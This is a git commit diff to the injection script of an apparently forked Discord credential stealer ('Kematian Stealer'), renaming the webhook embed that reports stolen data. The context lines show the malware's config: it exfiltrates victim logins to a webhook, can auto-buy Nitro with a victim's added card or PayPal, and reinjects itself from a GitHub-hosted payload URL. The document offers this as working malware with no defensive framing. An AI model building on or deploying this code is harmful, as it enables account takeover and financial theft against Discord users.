3de0308396779c10bd7d00fd24b6b6c9d0136835
43a1723 <hai1723notgay@gmail.com>
2024-06-24 17:08:45 +0700

    Update injection.js

--- frontend-src/injection.js
+++ frontend-src/injection.js
@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Kematian Injection', //name of the webhook thats gonna send the info
+  embed_name: 'Stealer Vietname Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://i.imgur.com/6w6qWCB.jpeg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://github.com/adasdasdsaf/Kematian-Stealer/raw/main/frontend-src/injection.js', //injection url for when it reinjects
